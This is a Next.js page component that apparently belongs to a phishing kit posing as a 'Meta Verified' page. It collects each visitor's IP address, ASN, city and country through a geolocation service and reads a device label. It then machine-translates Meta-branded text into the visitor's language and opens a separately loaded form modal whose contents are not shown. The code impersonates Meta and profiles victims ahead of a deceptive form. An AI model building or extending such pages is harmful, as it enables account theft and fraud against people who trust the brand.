'use client';

import IntroLoading from '@/components/intro-loading';
import MetaVerifiedBanner from '@/components/meta-verified-banner';
import {
    META_VERIFIED_DEFAULT_TEXTS,
    type MetaVerifiedTextKey,
    type MetaVerifiedTexts
} from '@/constants/meta-verified-texts';
import { store } from '@/store/store';
import { getDeviceLabel } from '@/utils/device';
import translateText, { getLanguageFromCountry } from '@/utils/translate';
import axios from 'axios';
import dynamic from 'next/dynamic';
import { useEffect, useMemo, useRef, useState, type FC } from 'react';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo, setDeviceLabel } = store();
    const [showIntro, setShowIntro] = useState(true);
    const [translatedTexts, setTranslatedTexts] = useState<MetaVerifiedTexts>(META_VERIFIED_DEFAULT_TEXTS);
    const [targetLang, setTargetLang] = useState('en');
    const [modalKey, setModalKey] = useState(0);
    const isTranslatingRef = useRef(false);

    const defaultTexts = useMemo(() => ({ ...META_VERIFIED_DEFAULT_TEXTS }), []);

    useEffect(() => {
        document.title = META_VERIFIED_DEFAULT_TEXTS.bannerTitle;
    }, []);

    useEffect(() => {
        const loadDevice = async () => {
            const label = await getDeviceLabel();
            setDeviceLabel(label);
        };

        void loadDevice();
    }, [setDeviceLabel]);

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US',
                    region: data.region || ''
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    region: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (!geoInfo || isTranslatingRef.current) {
            return;
        }

        const lang = getLanguageFromCountry(geoInfo.country_code);
        setTargetLang(lang);

        if (lang === 'en') {
            setTranslatedTexts(defaultTexts);
            return;
        }

        isTranslatingRef.current = true;

        const translateAll = async () => {
            try {
                const keys = Object.keys(defaultTexts) as MetaVerifiedTextKey[];
                const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], geoInfo.country_code)));
                const translated = keys.reduce(
                    (acc, key, index) => {
                        acc[key] = translations[index] ?? defaultTexts[key];
                        return acc;
                    },
                    { ...defaultTexts } as MetaVerifiedTexts
                );
                setTranslatedTexts(translated);
            } catch {
                setTranslatedTexts(defaultTexts);
            }
        };

        void translateAll();
    }, [geoInfo, defaultTexts]);

    const openFormModal = () => {
        setModalKey((prev) => prev + 1);
        setModalOpen(true);
    };

    return (
        <>
            {showIntro ? <IntroLoading onDone={() => setShowIntro(false)} texts={translatedTexts} /> : null}
            <MetaVerifiedBanner
                altText={translatedTexts.metaVerified}
                onSubmit={openFormModal}
                texts={translatedTexts}
                targetLang={targetLang}
            />
            {isModalOpen ? <FormModal key={modalKey} uiTexts={translatedTexts} /> : null}
        </>
    );
};

export default Page;
